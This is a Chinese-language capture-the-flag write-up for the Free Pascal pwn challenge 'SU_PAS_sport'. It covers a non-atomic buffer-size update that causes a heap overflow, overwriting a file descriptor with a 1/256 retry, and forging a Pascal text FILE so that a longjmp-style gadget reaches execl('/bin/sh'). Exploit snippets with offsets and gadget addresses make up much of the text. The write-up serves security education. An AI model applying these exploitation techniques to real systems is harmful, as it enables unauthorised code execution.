# SU_PAS_sport

## 题目简述

题目使用 Free Pascal 3.2.2 实现了一个“设备与数据海洋”菜单。用户可以：

1. 以 byte 或 text 方式打开 `/dev/urandom`；
2. 关闭已打开的设备；
3. 设置全局缓冲区大小并申请缓冲区；
4. 从设备读取指定长度的数据到缓冲区并回显。

附件程序为 64 位静态链接 ELF，No PIE、No Canary、NX 开启、No RELRO。Pascal 自带的运行时、堆管理器和文件结构都被静态编入二进制，因此常规 glibc 堆模板不适用。预期解法利用缓冲区大小状态不同步制造堆溢出，再覆盖 Pascal text FILE 的函数表，通过 `longjmp` 风格入口设置寄存器并调用运行时的 `execl` 封装。

## 解题过程

源码中的 `create_ocean()` 先修改全局 `bufsize`，随后才检查上限：

```pascal
readln(bufsize);
if bufsize > $400 then begin
    writeln('No such big ocean.');
    exit;
end;
if buf <> nil then freemem(buf);
getmem(buf, bufsize);
```

这两个动作本应是同一状态更新，却可以只完成前半部分：

1. 先输入不超过 `0x400` 的大小，得到真实的小缓冲区；
2. 再输入大于 `0x400` 的值，函数提前返回；
3. `buf` 仍指向旧的小块，`bufsize` 却已经变大。

`pull_data()` 只用全局 `bufsize` 检查读取长度：

```pascal
if len > bufsize then exit;
blockread(fp1^, buf^, len);
```

因此可以把超过真实分配大小的数据写入相邻对象。

Free Pascal 默认静态编译，反编译结果中有大量无符号运行时函数。仓库同时提供了带调试信息的 `chall-debug`，可以结合 `strace` 和 GDB 还原：

- 缓冲区和两个文件对象由同一套 Pascal 堆管理器分配，合理安排顺序后会相邻；
- allocator 的用户区前约有 `0x20` 字节元数据；
- byte/text 文件结构开头四字节是文件描述符；
- text 文件结构中还保存 open、read、write、close 等回调指针。

推荐的分配顺序为：

```python
add_ocean(0x300)  # 小缓冲区
open_gate(1)      # byte FILE
open_gate(2)      # text FILE
add_ocean(0x1000) # 只把全局 bufsize 改大
```

最初 byte FILE 的 fd 指向 `/dev/urandom`，攻击者还不能控制溢出内容。先读取 `0x321` 字节随机数据，让最后一个随机字节覆盖 byte FILE 的 fd 低字节。若该字节恰好为 `0x00`，原 fd `3` 就变为标准输入 fd `0`；概率为 $1/256$。程序会把数据十六进制回显，所以脚本可以检查目标位置，不成功就重新连接：

```python
pull(gate=1, length=0x321)
line = read_target_line()
if line != b"00 \n":
    io.close()
    retry()
```

一旦 byte FILE 的 fd 变成 0，后续 `blockread()` 就从攻击者的标准输入读取，得到稳定的可控堆溢出。exp 根据实际堆布局使用：

```python
pos_byte_file = 0x370
pos_text_file = 0x610

payload = b"a" * (pos_byte_file - 0x50)
payload += p64(0xd7b300000000) + p64(1)
payload = payload.ljust(pos_text_file - 0x50, b"\x00")
```

这些位置是附件版本及该分配顺序下的结果，复现时应在 GDB 中从回显缓冲区搜索已知字节，确认 `buf`、byte FILE 和 text FILE 的相对距离。

直接把 text FILE 回调改成 `system` 不可行：Pascal 调用回调时会先检查 fd，且首个参数是 FILE 结构地址，不是可控命令字符串。静态运行时中存在一个等价于 `longjmp` 的寄存器恢复片段：

```asm
mov rbx, [rdi+0x08]
mov r12, [rdi+0x10]
mov r13, [rdi+0x18]
mov r14, [rdi+0x20]
mov r15, [rdi+0x28]
mov rsp, [rdi+0x30]
jmp qword ptr [rdi+0x38]
```

由于 `rdi` 指向被覆盖的 text FILE，便可以把该 FILE 同时当成伪造的跳转上下文。程序 No PIE，附件版本可使用：

```python
binsh = 0x45ee70
fake_stack = 0x480f80
execl_entry = 0x4530a7
longjmp_gadget = 0x402aef
```

text FILE 的关键伪造内容为：

```python
fake_text = p64(0xd7b100000004) + p64(0x100)
fake_text += p64(binsh)                 # +0x10 -> r12 -> rdi
fake_text += p64(0)                     # +0x18 -> r13
fake_text += p64(2**64 - 1)             # +0x20 -> r14 -> rdx
fake_text += p64(fake_stack + 0x10)     # +0x28 -> r15 -> rsi
fake_text += p64(fake_stack)            # +0x30 -> rsp
fake_text += p64(execl_entry)           # +0x38 -> 下一跳
fake_text += p64(0)
fake_text += p64(longjmp_gadget)        # 被 close 路径调用的回调
```

`execl_entry` 是 Pascal 运行时执行接口内部的合适入口，它形成的数据流为：

```text
rdi <- r12 <- [fake FILE + 0x10]  = "/bin/sh"
rsi <- r15 <- [fake FILE + 0x28]  = 指向全零伪栈
rdx <- r14 <- [fake FILE + 0x20]  = -1
```

调试表明第三个参数会参与计算附加命令参数数量。设为 `0` 会让最终 `execve` 多出一个空参数，设为其他正数会产生更多空参数；设置为补码 `-1` 后不再附加空参数，能够正确执行 `/bin/sh`。

把伪造结构写入后关闭 text gate：

```python
close_gate(2)
```

关闭路径经被覆盖的回调进入寄存器恢复片段，再跳到运行时 `execl` 入口，最终得到 shell，读取 flag 即可。

## 方法总结

本题首先考查“状态更新不是原子操作”：全局长度在合法性检查之前被提交，而内存对象没有同步更新，导致逻辑上的容量与真实分配脱节。随后又要求脱离 glibc 习惯，按 Free Pascal 的 allocator 和 FILE 布局建立利用。

面对静态链接、非常规语言运行时时，最有效的方法是编译一份同版本、带调试符号的最小程序，把标准库函数边界和结构字段映射回题目；不能把 Pascal FILE 当成 glibc `_IO_FILE`。随机字节覆盖 fd 的步骤确实只有 $1/256$ 成功率，但程序回显提供了明确判据，脚本应把它实现成可解释的重试，而不是无限盲跑。最后选择 `longjmp` 类寄存器恢复入口，是因为 FILE 回调的首参固定，必须先把伪结构转换为可控寄存器上下文。
